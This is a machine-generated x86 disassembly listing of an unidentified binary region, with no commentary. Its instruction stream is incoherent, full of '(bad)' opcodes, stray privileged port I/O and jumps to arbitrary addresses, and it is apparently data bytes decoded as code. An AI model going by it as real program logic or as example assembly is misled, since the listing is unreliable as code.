  421c80:	mov    ebp,0x30ccff0c
  421c85:	dec    edx
  421c86:	mov    ?,WORD PTR [ecx]
  421c88:	fs adc al,0x95
  421c8b:	xor    WORD PTR [edx],bx
  421c8e:	jae    0x421c9d
  421c90:	pop    ds
  421c91:	inc    eax
  421c92:	out    dx,eax
  421c93:	fist   DWORD PTR [esi-0x43]
  421c96:	or     BYTE PTR [ebx+0x58eccd87],al
  421c9c:	pop    esi
  421c9d:	ss pop ebx
  421c9f:	iret   
  421ca0:	fmul   DWORD PTR [eax-0x13]
  421ca3:	jb     0x421cfc
  421ca5:	push   ebp
  421ca6:	sar    DWORD PTR [esi+0x31b4c2c8],1
  421cac:	stos   BYTE PTR es:[edi],al
  421cad:	rol    BYTE PTR [esi+0x7c],0xa5
  421cb1:	mov    edi,0x2a5a05e8
  421cb6:	add    al,0xb0
  421cb8:	jns    0x421c7b
  421cba:	sti    
  421cbb:	loop   0x421cc1
  421cbd:	out    0x3b,al
  421cbf:	cmp    DWORD PTR [eax-0x74],0xfffffff3
  421cc3:	xchg   ecx,eax
  421cc4:	fild   QWORD PTR [edi]
  421cc6:	add    al,BYTE PTR [edx-0x7b9c40a6]
  421ccc:	mov    dh,0x73
  421cce:	dec    ebx
  421ccf:	jb     0x421ce7
  421cd1:	xlat   BYTE PTR ds:[ebx]
  421cd2:	sbb    DWORD PTR [esi+0x710237b6],0x24
  421cd9:	push   ecx
  421cda:	add    DWORD PTR [eax+0xe],0xb820b95
  421ce1:	push   ebp
  421ce2:	inc    edi
  421ce3:	pop    eax
  421ce4:	inc    ebx
  421ce5:	setb   BYTE PTR [eax]
  421ce8:	or     al,ah
  421cea:	xchg   DWORD PTR [edi],ecx
  421cec:	mov    al,0x4f
  421cee:	ret    
  421cef:	jle    0x421d44
  421cf1:	jmp    0x421cbd
  421cf3:	cmp    bl,bh
  421cf5:	fistp  DWORD PTR [ebx+0xba24216]
  421cfb:	pop    ss
  421cfc:	and    DWORD PTR [ebx+0x11f09cb5],eax
  421d02:	lds    eax,FWORD PTR [edx+0x2487dab7]
  421d08:	sub    al,0xfc
  421d0a:	loopne 0x421ce0
  421d0c:	lahf   
  421d0d:	outs   dx,DWORD PTR ds:[esi]
  421d0e:	push   0xe54e9ca5
  421d13:	popa   
  421d14:	enter  0x912d,0xb3
  421d18:	xchg   BYTE PTR [eax+0x17],bl
  421d1b:	jecxz  0x421ca6
  421d1d:	lahf   
  421d1e:	test   al,0x69
  421d20:	scas   eax,DWORD PTR es:[edi]
  421d21:	gs pop ds
  421d23:	adc    eax,0x9a2c7091
  421d28:	and    DWORD PTR [ecx],edx
  421d2a:	dec    eax
  421d2b:	cmp    al,BYTE PTR [ebp+0x48]
  421d2e:	mov    bh,0x6c
  421d30:	icebp  
  421d31:	and    DWORD PTR [esi+0x7edf43ff],edi
  421d37:	fisub  WORD PTR [edi+0x7e1abad6]
  421d3d:	mov    bh,0x6b
  421d3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d40:	scas   eax,DWORD PTR es:[edi]
  421d41:	push   esi
  421d42:	enter  0xd086,0xe3
  421d46:	or     eax,0xc4238b8f
  421d4b:	dec    esi
  421d4c:	push   ebp
  421d4d:	xchg   ecx,eax
  421d4e:	fwait
  421d4f:	es int 0xed
  421d52:	mov    ecx,0x64ed7249
  421d57:	mov    al,ds:0x6207febc
  421d5c:	adc    DWORD PTR [esi*4+0x42f96688],edi
  421d63:	mov    edx,0x268e3c36
  421d68:	cmp    eax,0x40c5092c
  421d6d:	cmp    al,0x62
  421d6f:	dec    edx
  421d70:	cmp    cl,ch
  421d72:	mov    ecx,0x5f2b461c
  421d77:	sub    eax,0x87e36923
  421d7c:	enter  0x4695,0xc1
  421d80:	add    dl,bh
  421d82:	fild   WORD PTR [ebp+eax*4-0x2d]
  421d86:	and    dl,BYTE PTR [ebx+0x1c97b45d]
  421d8c:	nop
  421d8d:	jbe    0x421dab
  421d8f:	and    esp,DWORD PTR [edi]
  421d91:	fcom   QWORD PTR [ecx-0x24830a9e]
  421d97:	lods   eax,DWORD PTR ds:[esi]
  421d98:	xor    BYTE PTR [ecx+edx*4+0x5d],dl
  421d9c:	loope  0x421d85
  421d9e:	cmp    ebx,DWORD PTR [ebp+0x7f]
  421da1:	lock add al,0x35
  421da4:	pop    esp
  421da5:	enter  0xc3d1,0x8e
  421da9:	and    esp,DWORD PTR [esi]
  421dab:	mov    bl,0x4a
  421dad:	iret   
  421dae:	cmp    al,0xb7
  421db0:	cli    
  421db1:	push   0x53
  421db3:	sbb    bh,BYTE PTR ds:0x58e2e925
  421db9:	jmp    0x8de455a3
  421dbe:	cmp    DWORD PTR [ecx+0x3e],ebx
  421dc1:	(bad)  
  421dc2:	not    BYTE PTR [edi+0x28c28723]
  421dc8:	shl    DWORD PTR [edi],cl
  421dca:	xor    esi,DWORD PTR [edi]
  421dcc:	pop    es
  421dcd:	aas    
  421dce:	scas   al,BYTE PTR es:[edi]
  421dcf:	dec    esi
  421dd0:	jecxz  0x421e1b
  421dd2:	sbb    edi,0xae6afe9b
  421dd8:	add    bl,BYTE PTR [eax-0x714ee855]
  421dde:	jmp    0xed214fd6
  421de3:	cmc    
  421de4:	push   ss
  421de5:	rcr    BYTE PTR [esi],0xec
  421de8:	adc    esp,esp
  421dea:	xor    DWORD PTR [ecx-0x4d],ecx
  421ded:	or     DWORD PTR [ebx],ebp
  421def:	cld    
  421df0:	ins    BYTE PTR es:[edi],dx
  421df1:	shl    DWORD PTR [ecx],0x8b
  421df4:	inc    eax
  421df5:	rcl    DWORD PTR [esi-0x1b429693],0xc1
  421dfc:	popf   
  421dfd:	es in  eax,dx
  421dff:	mov    eax,0x96489bb3
  421e04:	cmp    al,0xe6
  421e06:	jmp    edx
  421e08:	arpl   WORD PTR [edx],bp
  421e0a:	gs aam 0xa4
  421e0d:	enter  0xf49b,0xc
  421e11:	mov    DWORD PTR [ebx],eax
  421e13:	inc    edx
  421e14:	push   ds
  421e15:	push   ecx
  421e16:	(bad)  
  421e17:	subps  xmm4,XMMWORD PTR [ebp+0x32]
  421e1b:	mov    eax,0x58b497e8
  421e20:	add    ebp,eax
  421e22:	adc    dl,cl
  421e24:	call   DWORD PTR [ecx-0x10]
  421e27:	add    al,0x8f
  421e29:	adc    BYTE PTR [eax],ah
  421e2b:	add    eax,0x35e91566
  421e30:	push   ebx
  421e31:	mov    ds:0x35ff4dff,al
  421e36:	loope  0x421dfc
  421e38:	sbb    al,0x52
  421e3a:	xor    esp,esi
  421e3c:	pop    esp
  421e3d:	sahf   
  421e3e:	sbb    DWORD PTR [eax+0x73],esi
  421e41:	mov    edx,0xdece5a52
  421e46:	jb     0x421e9a
  421e48:	push   0xbb91b7a
  421e4d:	cmp    DWORD PTR [ecx+eiz*2+0x7b],0x19
  421e52:	dec    eax
  421e53:	and    eax,0xc997ecbd
  421e58:	scas   al,BYTE PTR es:[edi]
  421e59:	leave  
  421e5a:	or     eax,DWORD PTR [ebx+edx*2]
  421e5d:	mov    BYTE PTR [ebx-0x15],cl
  421e60:	xor    BYTE PTR [eax],bl
  421e62:	push   0xbc54bf0f
  421e67:	and    eax,edi
  421e69:	or     al,0xd7
  421e6b:	imul   edx,DWORD PTR [ebx+0x6f407176],0xa
  421e72:	lods   al,BYTE PTR ds:[esi]
  421e73:	fld    TBYTE PTR [eiz*2+0x3615bf0b]
  421e7a:	scas   eax,DWORD PTR es:[edi]
  421e7b:	test   eax,0x4bd8189d
  421e80:	xor    BYTE PTR [eax],0xc
  421e83:	out    0x29,al
  421e85:	cs xchg ebx,eax
  421e87:	mov    dl,0xa0
  421e89:	xlat   BYTE PTR ds:[ebx]
  421e8a:	mov    ds:0xe3d272df,al
  421e8f:	jnp    0x421ea3
  421e91:	clc    
  421e92:	cmp    BYTE PTR [ebp+0xe],cl
  421e95:	in     eax,0x49
  421e97:	cli    
  421e98:	lea    ecx,gs:[edi+0x562e6c09]
  421e9f:	out    dx,eax
  421ea0:	push   ds
  421ea1:	enter  0xb0c,0xac
  421ea5:	in     al,0x8d
  421ea7:	aam    0x38
  421ea9:	out    dx,eax
  421eaa:	and    BYTE PTR [ecx],0xa7
  421ead:	cmp    al,0x81
  421eaf:	xchg   esp,eax
  421eb0:	or     BYTE PTR [ebp+0x21],al
  421eb3:	xor    edx,DWORD PTR ds:0xd3464deb
  421eb9:	sbb    al,0x45
  421ebb:	adc    BYTE PTR [edx+edx*1],dh
  421ebe:	or     eax,0x401499e9
  421ec3:	cmp    al,0x9d
  421ec5:	and    esi,DWORD PTR [eax+0x5f]
  421ec8:	out    dx,eax
  421ec9:	or     ebx,DWORD PTR [eax-0x370b7d2d]
  421ecf:	mov    ecx,0x598e5238
  421ed4:	dec    edx
  421ed5:	arpl   WORD PTR [esi+0x74],bp
  421ed8:	add    al,0x4
  421eda:	fpatan 
  421edc:	mov    ch,0x6d
  421ede:	lds    ebp,FWORD PTR [ebx+0x1]
  421ee1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ee2:	adc    edx,0xffffffbc
  421ee5:	dec    ebp
  421ee6:	fidivr WORD PTR [edx]
  421ee8:	aas    
  421ee9:	ins    BYTE PTR es:[edi],dx
  421eea:	and    esp,ecx
  421eec:	pop    ecx
  421eed:	mov    ds:0x631d1bfc,eax
  421ef2:	sar    al,0xbd
  421ef5:	or     DWORD PTR [edx+0x61],edx
  421ef8:	add    BYTE PTR [edi-0x5f47f371],ah
  421efe:	addr16 out dx,al
  421f00:	stc    
  421f01:	jno    0x421e98
  421f03:	xchg   DWORD PTR [esp+ecx*8],ecx
  421f06:	loop   0x421eb4
  421f08:	sbb    eax,0x7ceed87c
  421f0d:	mov    ch,0xab
  421f0f:	add    BYTE PTR [ebp-0x80],al
  421f12:	pop    edx
  421f13:	or     DWORD PTR [edi+0x11a8f8e4],esp
  421f19:	stos   BYTE PTR es:[edi],al
  421f1a:	call   0x174a:0xaddb7b9b
  421f21:	stos   BYTE PTR es:[edi],al
  421f22:	cmp    DWORD PTR [ecx-0x73],0x97c30600
  421f29:	sar    DWORD PTR [ebp+0x3eb2a7ef],cl
  421f2f:	inc    esi
  421f30:	adc    DWORD PTR [eax],0x6a
  421f33:	rcr    DWORD PTR ds:0x14489b6e,1
  421f39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f3a:	popa   
  421f3b:	das    
  421f3c:	ja     0x421edb
  421f3e:	lds    esi,FWORD PTR es:[ecx]
  421f41:	loope  0x421f33
  421f43:	(bad)  
  421f44:	sbb    eax,0x6dd965e
  421f49:	shl    DWORD PTR [ecx+0x72],1
  421f4c:	bound  ebp,QWORD PTR [edi+ecx*4-0x4be8fe4b]
  421f53:	xor    ecx,0xffffffe7
  421f56:	add    DWORD PTR [esi-0x2],0xffffff98
  421f5a:	fsubr  QWORD PTR [ebp+0xc]
  421f5d:	or     al,0xe2
  421f5f:	and    al,0xe6
  421f61:	push   cs
  421f62:	xor    BYTE PTR ds:0x9fa8d505,ch
  421f68:	xchg   ebx,eax
  421f69:	mov    edx,0xcaea7858
  421f6e:	sub    edx,esp
  421f70:	cmp    ah,BYTE PTR [edi]
  421f72:	mov    esi,0xb10d5923
  421f77:	inc    ebp
  421f78:	enter  0x43ca,0xd1
  421f7c:	dec    esp
  421f7d:	(bad)  
  421f7e:	cdq    
  421f7f:	daa    
  421f80:	call   0x23a07187
  421f85:	dec    ebp
  421f86:	aaa    
  421f87:	rol    DWORD PTR [ecx-0x21],1
  421f8a:	retf   
  421f8b:	in     eax,0x9c
  421f8d:	mov    BYTE PTR [edx+eiz*2],dl
  421f90:	imul   eax,DWORD PTR [edx-0x29],0xffffffd6
  421f94:	inc    ebp
  421f95:	mov    si,0x6515
  421f99:	cmp    BYTE PTR [edx+eiz*2+0x2b],0xfa
  421f9e:	cmp    esi,edx
  421fa0:	ror    DWORD PTR [edx-0x27],0x5c
  421fa4:	lods   eax,DWORD PTR ds:[esi]
  421fa5:	xor    eax,DWORD PTR [edi+0x5c96ce9e]
  421fab:	xor    eax,0xa29c4101
  421fb0:	add    eax,0x997a3bbb
  421fb5:	es ds pushaw 
  421fb9:	pushf  
  421fba:	sbb    ebp,DWORD PTR [edx+0x7d6a9fe2]
  421fc0:	or     DWORD PTR [ecx+edi*1-0x1d21c672],esp
  421fc7:	jno    0x421fe8
  421fc9:	or     BYTE PTR [ebp+0x4],dl
  421fcc:	xor    al,0x59
  421fce:	loop   0x422027
  421fd0:	je     0x421fe0
  421fd2:	aas    
  421fd3:	jb     0x421fd6
  421fd5:	fsubrp st(3),st
  421fd7:	gs inc edi
  421fd9:	push   eax
  421fda:	xchg   esi,eax
  421fdb:	lahf   
  421fdc:	scas   eax,DWORD PTR es:[edi]
  421fdd:	inc    esi
  421fde:	adc    BYTE PTR [eax-0x54],ch
  421fe1:	add    DWORD PTR [eax+0x7a34d9b1],ebp
  421fe7:	mov    eax,DWORD PTR [edx+0xea08e41]
  421fed:	jmp    0xc5d:0x31c72f
  421ff4:	add    BYTE PTR [eax],ah
  421ff6:	inc    ebx
  421ff7:	es leave 
  421ff9:	jne    0x422016
  421ffb:	sub    esp,eax
  421ffd:	sbb    eax,0xe56bd19c
  422002:	mov    ebx,cs
  422004:	push   0x66
  422006:	pop    esi
  422007:	jmp    0xa8892cc8
  42200c:	or     esp,ecx
  42200e:	out    0x80,al
  422010:	repnz mov ds:0xa656be54,eax
  422016:	and    BYTE PTR [edx-0x45],bh
  422019:	shr    BYTE PTR ds:[edx-0x25],cl
  42201d:	xor    DWORD PTR [esp+ebx*4],ecx
  422020:	jle    0x422068
  422022:	mov    eax,ds:0x479633b
  422027:	mov    ch,0xd1
  422029:	jmp    0x421fcc
  42202b:	add    dh,BYTE PTR [ebx+eax*8+0x4e546025]
  422032:	push   edi
  422033:	sub    DWORD PTR ds:0x90e04ec8,edx
  422039:	std    
  42203a:	fsubr  QWORD PTR [eax+0x6e]
  42203d:	mov    WORD PTR [ebx],es
  42203f:	jp     0x422072
  422041:	test   BYTE PTR ds:0x998422c7,al
  422047:	jg     0x4220c1
  422049:	and    BYTE PTR [ebx+0xd],ch
  42204c:	scas   al,BYTE PTR es:[edi]
  42204d:	adc    ebp,DWORD PTR [ebp+0x62]
  422050:	stos   BYTE PTR es:[edi],al
  422051:	js     0x4220b5
  422053:	es pop esi
  422055:	sub    dl,BYTE PTR [edx+0x29]
  422058:	repnz pushw 0x7e
  42205c:	adc    DWORD PTR [ecx+eiz*2+0x56714588],esp
  422063:	call   0x51c6:0x6a53c32e
  42206a:	dec    edi
  42206b:	lods   eax,DWORD PTR es:[esi]
  42206d:	loopne 0x422075
  42206f:	jno    0x4220ef
  422071:	fcomi  st,st(7)
  422073:	cmp    al,0x5f
  422075:	ins    BYTE PTR es:[edi],dx
  422076:	loop   0x4220a7
  422078:	mov    ebp,0x6566db82
  42207d:	(bad)  
  42207e:	sbb    al,BYTE PTR [ebx]
  422080:	sbb    al,0x9d
  422082:	(bad)  
  422083:	out    dx,al
  422084:	cli    
  422085:	push   ebp
  422086:	push   ecx
  422087:	inc    ebx
  422088:	or     eax,DWORD PTR ds:0x527319a0
  42208e:	enter  0xb47,0xf5
  422092:	jg     0x4220f8
  422094:	fisubr DWORD PTR [edx-0x16e1b6c]
  42209a:	add    cl,BYTE PTR [esp+edi*4+0x32d18a92]
  4220a1:	push   0x5ee56b87
  4220a6:	xor    eax,0x35d3c964
  4220ab:	aas    
  4220ac:	jmp    0xa3cc:0x7c71f489
  4220b3:	(bad)  
  4220b4:	fldcw  WORD PTR [edx+edx*2-0x78]
  4220b8:	dec    edi
  4220b9:	push   eax
  4220ba:	sub    BYTE PTR [esp+esi*8-0x4c874b6c],0xaf
  4220c2:	xchg   esi,eax
  4220c3:	sub    eax,0xf87bebea
  4220c8:	adc    BYTE PTR [eax-0x7216284e],cl
  4220ce:	fdiv   st(2),st
  4220d0:	nop
  4220d1:	mov    ah,dl
  4220d3:	(bad)  
  4220d4:	enter  0xa4ea,0xac
  4220d8:	js     0x42207b
  4220da:	xchg   ebx,eax
  4220db:	ja     0x4220de
  4220dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220de:	pop    ds
  4220df:	add    DWORD PTR [ebp+0x4968782c],edx
  4220e5:	fwait
  4220e6:	popa   
  4220e7:	jge    0x422130
  4220e9:	inc    ebx
  4220ea:	push   esp
  4220eb:	addr16 sbb al,0xe1
  4220ef:	jp     0x42215c
  4220f1:	xchg   DWORD PTR [eax-0x7d],ecx
  4220f4:	in     eax,dx
  4220f5:	outs   dx,BYTE PTR ds:[esi]
  4220f6:	cli    
  4220f7:	push   edx
  4220f8:	sub    al,0x77
  4220fa:	mov    eax,ds:0xd6bae340
  4220ff:	fs in  al,dx
  422101:	pop    ebp
  422102:	test   DWORD PTR [ecx-0x4f2811a7],edx
  422108:	int    0x1e
  42210a:	xchg   ecx,eax
  42210b:	sbb    eax,0x12c4e1d1
  422110:	fst    DWORD PTR [ebx+0x4943f768]
  422116:	(bad)  
  422117:	out    0x8a,eax
  422119:	jb     0x422171
  42211b:	in     eax,0x0
  42211d:	push   ebp
  42211e:	pop    edi
  42211f:	icebp  
  422120:	add    al,0xcc
  422122:	(bad)  ds:0x6c77c673
  422128:	jecxz  0x4220c3
  42212a:	mov    ?,WORD PTR [edx-0x2fea692b]
  422130:	ret    0x1d82
  422133:	xchg   ebx,eax
  422134:	shr    BYTE PTR [ebp+eax*2+0x3de55be1],0xea
  42213c:	sbb    DWORD PTR [edi],edx
  42213e:	xchg   ecx,eax
  42213f:	leave  
  422140:	out    dx,al
  422141:	pop    eax
  422142:	int3   
  422143:	cmp    al,0x67
  422145:	xor    al,0xf7
  422147:	xlat   BYTE PTR ds:[ebx]
  422148:	add    DWORD PTR [ebx+0x7e],ebp
  42214b:	outs   dx,BYTE PTR ds:[esi]
  42214c:	pusha  
  42214d:	mov    al,0x59
  42214f:	mov    al,ds:0x55503d5e
  422154:	in     eax,0xf4
  422156:	fidiv  WORD PTR [eax-0x57]
  422159:	xor    dh,BYTE PTR [esi+0xf1c0fa]
  42215f:	cli    
  422160:	hlt    
  422161:	cmp    ebx,ecx
  422163:	sar    BYTE PTR [ebx-0x73],1
  422166:	mov    ebp,0xb8e7f8a6
  42216b:	out    0x68,al
  42216d:	mov    dl,0x9
  42216f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422170:	loop   0x422138
  422172:	mov    esp,DWORD PTR [edx-0x80]
  422175:	mov    al,0x97
  422177:	mov    bh,0x2b
  422179:	inc    ebx
  42217a:	cmp    eax,0xa00bd316
  42217f:	rol    DWORD PTR [edi-0x4739f71d],1
  422185:	xchg   esp,eax
  422186:	fist   DWORD PTR [ebp+0x16204f45]
  42218c:	aas    
  42218d:	in     eax,0x12
  42218f:	mov    eax,0xa0cf95e
  422194:	add    eax,0xc090c983
  422199:	cld    
  42219a:	test   dl,ah
  42219c:	je     0x4221b0
  42219e:	sbb    ah,BYTE PTR [ebp+ecx*1-0x79645635]
  4221a5:	jl     0x422196
  4221a7:	push   edi
  4221a8:	xchg   ebx,eax
  4221a9:	popf   
  4221aa:	or     eax,0xfc2d8a94
  4221af:	jl     0x422145
  4221b1:	jnp    0x42215d
  4221b3:	pop    es
  4221b4:	stos   DWORD PTR es:[edi],eax
  4221b5:	fs in  eax,dx
  4221b7:	mov    ecx,0x3d3f241
  4221bc:	adc    al,0xb5
  4221be:	jo     0x422150
  4221c0:	adc    DWORD PTR [edx-0x40b89ef5],0xb7eee739
  4221ca:	outs   dx,DWORD PTR ds:[esi]
  4221cb:	sbb    edi,eax
  4221cd:	cmp    DWORD PTR [ebx-0x75],esp
  4221d0:	mov    ecx,0xc07327b
  4221d5:	cdq    
  4221d6:	xchg   edx,eax
  4221d7:	test   al,0x81
  4221d9:	or     DWORD PTR [edi+edi*4],esi
  4221dc:	hlt    
  4221dd:	adc    edi,esi
  4221df:	jne    0x42218d
  4221e1:	mov    ecx,0xafc7abf8
  4221e6:	cmp    al,0xfd
  4221e8:	iret   
  4221e9:	(bad)  
  4221eb:	neg    BYTE PTR [esi+ebx*4]
  4221ee:	nop
  4221ef:	out    dx,eax
  4221f0:	xchg   esp,eax
  4221f1:	jl     0x422261
  4221f3:	mov    bl,0xf7
  4221f5:	mov    DWORD PTR [esi+0xe],0x14e50e20
  4221fc:	repz push ebp
  4221fe:	addr16 sti 
  422200:	aad    0x62
  422202:	arpl   cx,bp
  422204:	std    
  422205:	jle    0x422241
  422207:	and    DWORD PTR [edi+edx*8-0x4ff7d1d7],0x5eb2c420
  422212:	sbb    DWORD PTR [ebp-0x10cd6d05],0x9
  422219:	icebp  
  42221a:	cmp    dl,cl
  42221c:	dec    edx
  42221d:	sbb    ebx,ebx
  42221f:	imul   ebx,ebx,0xffffff9e
  422222:	fwait
  422223:	push   esp
  422224:	or     eax,0x3dcc2e86
  422229:	dec    ebx
  42222a:	mov    ecx,0x76fbcc70
  42222f:	pop    ecx
  422230:	add    BYTE PTR [eax-0x6d04ac7c],al
  422236:	imul   ebx,DWORD PTR [edx+0x236cc413],0xbe08331a
  422240:	lahf   
  422241:	fild   QWORD PTR [ebx+0x4bc29c96]
  422247:	add    al,0x41
  422249:	sub    DWORD PTR [ecx+0x5b2d3473],ebp
  42224f:	jg     0x42220c
  422251:	int3   
  422252:	shr    DWORD PTR [esi-0xe],cl
  422255:	cmp    cl,bl
  422257:	(bad)  
  422258:	cmc    
  422259:	fs mov ah,bh
  42225c:	stc    
  42225d:	xlat   BYTE PTR ds:[ebx]
  42225e:	xchg   DWORD PTR [ecx-0x6c],esp
  422261:	and    al,0xba
  422263:	push   esp
  422264:	mov    BYTE PTR [ebp+0x60e7871d],bl
  42226a:	inc    di
  42226c:	mov    al,ds:0x3ca5fb5f
  422271:	pop    esi
  422272:	push   cs
  422273:	mov    al,BYTE PTR [eax-0x30b2a6d5]
  422279:	mov    ecx,es
  42227b:	push   0x78a274e
  422280:	sbb    DWORD PTR [edx-0xc8b69ee],edi
  422286:	aam    0xcd
  422288:	cmp    eax,0x57f3217f
  42228d:	stc    
  42228e:	add    ch,0x78
  422291:	imul   edx,eax,0xffffffb8
  422294:	xor    eax,0x17369fd
  422299:	popf   
  42229a:	or     edx,DWORD PTR [ecx+edi*8-0x45241494]
  4222a1:	xor    cl,dh
  4222a3:	jg     0x422303
  4222a5:	cdq    
  4222a6:	inc    esp
  4222a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222a8:	mov    ds:0x540e8dbb,eax
  4222ad:	jo     0x4222eb
  4222af:	in     eax,0xb6
  4222b1:	sbb    ebp,DWORD PTR [esi+edx*2-0x7fbac19c]
  4222b8:	icebp  
  4222b9:	jne    0x422264
  4222bb:	ins    DWORD PTR es:[edi],dx
  4222bc:	push   ebx
  4222bd:	push   eax
  4222be:	or     al,0xbf
  4222c0:	lods   al,BYTE PTR ds:[esi]
  4222c1:	sbb    al,0xcb
  4222c3:	cmp    edi,DWORD PTR [edx-0x3f]
  4222c6:	bound  ebp,QWORD PTR [edx-0x2af8101c]
  4222cc:	arpl   WORD PTR [eax-0x16],bx
  4222cf:	mov    esp,0x33b359f8
  4222d4:	cmp    eax,0x9dcf929d
  4222d9:	pushf  
  4222da:	mov    edi,0x4d181dda
  4222df:	gs test al,0x43
  4222e2:	js     0x4222ab
  4222e4:	jl     0x422276
  4222e6:	push   esi
  4222e7:	into   
  4222e8:	enter  0x89c3,0x10
  4222ec:	shl    BYTE PTR [ecx-0x4b31037],1
  4222f2:	cmp    eax,0x423184ff
  4222f7:	jmp    0xfef6:0xe3483281
  4222fe:	loope  0x422333
  422300:	push   eax
  422301:	xor    DWORD PTR [esi+ecx*4+0x613d3b4d],edx
  422308:	push   0xea3b4317
  42230d:	je     0x42235b
  42230f:	mov    ebp,0xa84eeca9
  422314:	retf   
  422315:	popf   
  422316:	ja     0x42235e
  422318:	and    DWORD PTR [ecx-0xa],esp
  42231b:	dec    esi
  42231c:	xchg   ebx,eax
  42231d:	packuswb mm2,QWORD PTR [edi]
  422320:	pusha  
  422321:	xchg   BYTE PTR [edx+edx*2-0x4],bl
  422325:	and    BYTE PTR ds:0xaea2d64,cl
  42232b:	pop    esi
  42232c:	or     eax,0xf656b8ae
  422331:	mov    ecx,0xc3ece344
  422336:	adc    bh,dh
  422338:	cmp    al,dh
  42233a:	pop    eax
  42233b:	adc    DWORD PTR [edi],edx
  42233d:	jle    0x42234f
  42233f:	or     eax,0x2966db59
  422344:	mov    edi,0xcdc6b9fa
  422349:	shl    BYTE PTR [edx+0x7050f0b],cl
  42234f:	jno    0x4222dd
  422351:	mov    ds:0x27a1bc75,eax
  422356:	push   ebp
  422357:	add    DWORD PTR [edx+0x51b8a325],ebx
  42235d:	enter  0x1767,0xd1
  422361:	push   es
  422362:	dec    DWORD PTR [ecx+0x6f6a0656]
  422368:	inc    esi
  422369:	sub    eax,0x751049aa
  42236e:	fstp   QWORD PTR [ebx]
  422370:	scas   eax,DWORD PTR es:[edi]
  422371:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422372:	bound  ecx,QWORD PTR [eax]
  422374:	and    BYTE PTR [edi+ecx*8],ah
  422377:	test   DWORD PTR [edi],ebx
  422379:	das    
  42237a:	sub    DWORD PTR [esi-0x22],edx
  42237d:	xor    esi,DWORD PTR [edx+esi*4]
  422380:	sahf   
  422381:	mov    esi,0x579d4fd
  422386:	mov    ds:0x7ec40e75,eax
  42238b:	inc    ecx
  42238c:	scas   al,BYTE PTR es:[edi]
  42238d:	mov    al,ds:0x68dbcdb6
  422392:	jae    0x422314
  422394:	or     al,0x7c
  422396:	fisub  DWORD PTR [ecx-0x137e0497]
  42239c:	(bad)  
  42239e:	jo     0x422363
  4223a0:	xlat   BYTE PTR ds:[ebx]
  4223a1:	push   cs
  4223a2:	rcr    DWORD PTR [edx+0x54],cl
  4223a5:	imul   ebx,DWORD PTR ds:0x6c477030,0x0
  4223ac:	cld    
  4223ad:	jnp    0x42239a
  4223af:	adc    BYTE PTR [eax],dh
  4223b1:	arpl   WORD PTR [ebp-0x1c],di
  4223b4:	jb     0x42235a
  4223b6:	loop   0x422428
  4223b8:	mov    bh,0x61
  4223ba:	pop    es
  4223bb:	loope  0x42235e
  4223bd:	dec    ebx
  4223be:	push   es
  4223bf:	cmp    al,0xc2
  4223c1:	(bad)  
  4223c2:	dec    ax
  4223c4:	xchg   esi,eax
  4223c5:	js     0x42241b
  4223c7:	dec    ebx
  4223c8:	cmp    DWORD PTR ds:0xea20475c,esp
  4223ce:	(bad)  
  4223cf:	cli    
  4223d0:	sub    al,0x92
  4223d2:	outs   dx,DWORD PTR ds:[esi]
  4223d3:	(bad)  
  4223d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4223d5:	xor    DWORD PTR [eax-0x5d4d92da],edi
  4223db:	sbb    eax,0x70a66e73
  4223e0:	jle    0x4223d3
  4223e2:	cmp    DWORD PTR [esi+0x28],eax
  4223e5:	scas   eax,DWORD PTR es:[edi]
  4223e6:	test   al,0x34
  4223e8:	nop
  4223e9:	(bad)  
  4223ea:	jp     0x422374
  4223ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223ed:	icebp  
  4223ee:	aam    0xf4
  4223f0:	or     DWORD PTR [edi],0xc2f82585
  4223f6:	fs std 
  4223f8:	dec    ebx
  4223f9:	ret    0xd6c
  4223fc:	fistp  DWORD PTR [edx+eiz*8-0x74]
  422400:	jmp    0x4383:0x87ad8c99
  422407:	sbb    al,0x94
  422409:	ret    0x14df
  42240c:	fsubr  DWORD PTR [eax+ebp*8-0x25]
  422410:	mov    eax,ds:0x4e250d69
  422415:	ret    0x53a6
  422418:	xchg   BYTE PTR [ebp+0x1cedae3c],dh
  42241e:	jne    0x4223a3
  422420:	adc    BYTE PTR [edi],dh
  422422:	mov    cl,0xce
  422424:	mov    bh,0x90
  422426:	xor    esi,esi
  422428:	sbb    BYTE PTR [ecx],0x1d
  42242b:	mov    edi,0xf9aab439
  422430:	xchg   BYTE PTR [ecx-0x1d9bf2b3],bh
  422436:	mov    WORD PTR [edx],cs
  422438:	mov    esp,0x161d5fdc
  42243d:	dec    ebx
  42243e:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  422440:	jge    0x422470
  422442:	xchg   edi,eax
  422443:	js     0x42249d
  422445:	mov    bl,0x5c
  422447:	bound  eax,QWORD PTR [ecx+0x2c9e1cf7]
  42244d:	and    cl,BYTE PTR [ebx-0x6c79e40f]
  422453:	jmp    0x8949:0xb8fa6285
  42245a:	sub    DWORD PTR [eax-0x479dcdfe],0x312523ff
  422464:	mov    ebx,0xf62e0a70
  422469:	in     al,dx
  42246a:	mov    esp,0x9506d5a4
  42246f:	fnstsw WORD PTR [eax+0x1b7cb032]
  422475:	retf   0xa0bd
  422478:	dec    esi
  422479:	dec    ebp
  42247a:	lods   al,BYTE PTR ds:[esi]
  42247b:	stc    
  42247c:	shr    DWORD PTR [esi+0x59e4c56f],cl
  422482:	xor    DWORD PTR [ecx-0x7c96bb3d],edx
  422488:	add    BYTE PTR [edx+0x5a],ch
  42248b:	pushf  
  42248c:	pushf  
  42248d:	xchg   ebx,eax
  42248e:	xchg   BYTE PTR [esi],ch
  422490:	std    
  422491:	lds    edi,FWORD PTR [edi-0xfd21ca9]
  422497:	mov    WORD PTR [ecx-0x2],ss
  42249a:	inc    edi
  42249b:	cmp    eax,0x3606f65
  4224a0:	cmp    dh,BYTE PTR [ecx+0x640b5d73]
  4224a6:	sbb    ebp,DWORD PTR [ecx+0x55]
  4224a9:	xor    edx,DWORD PTR [ecx]
  4224ab:	adc    al,BYTE PTR [edx-0x5a]
